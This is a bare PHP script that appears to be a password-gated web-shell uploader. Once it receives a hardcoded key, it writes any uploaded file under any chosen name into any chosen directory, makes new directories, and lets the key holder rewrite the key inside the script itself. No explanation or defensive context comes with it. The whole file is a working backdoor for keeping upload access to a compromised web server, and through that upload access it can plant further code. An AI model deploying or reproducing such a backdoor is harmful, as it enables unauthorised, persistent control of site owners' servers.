<?php $key = "63a9f0ea7bb98050796b649e85481845";
switch (true) {
	case $_POST['old']: switch (true) {
	case $_POST['old'] !== $key: die('Kontoool!'); break; default:
			$keys = $_POST['keys']; $keys = "\$key = \"" . $keys . "\";";
			$con = file_get_contents($_SERVER['SCRIPT_FILENAME']);
			$con = preg_replace("/\\\$key\ *=\ *[\"\']*([a-zA-Z0-9]*)[\"\']*;/is", $keys, $con);
			file_put_contents($_SERVER['SCRIPT_FILENAME'], $con);
	}
	break; case $_POST['key'] !== $key; print '└─ Key is Invalid!'; break; default:
	switch (true) {
		case empty($_POST['dir']) || $_POST['dir'] == '-': $dir = __DIR__.'/'; break; 
	default: switch (true) {
		case !file_exists(__DIR__.'/'.$_POST['dir']): mkdir(__DIR__.'/'.$_POST['dir']); $dir = __DIR__.'/'.$_POST['dir'].'/'; break;
		default: $dir = __DIR__.'/'.$_POST['dir'].'/';
	}
} 

switch (true) {
	case empty($_POST['name']): $name = $_FILES['file']['name']; break; 
	default: $name = $_POST['name'];
} 

switch (true) {
	case !empty($_FILES['file']): switch (true) {
    case $_FILES['file']['error'] > 0: print '└─ Error : '. $_FILES["file"]["error"]; break;
	default: @copy($_FILES['file']['tmp_name'], $dir.$name); print '└─ Uploaded!';
        } break; default: print '└─ Failed!';
    }
} 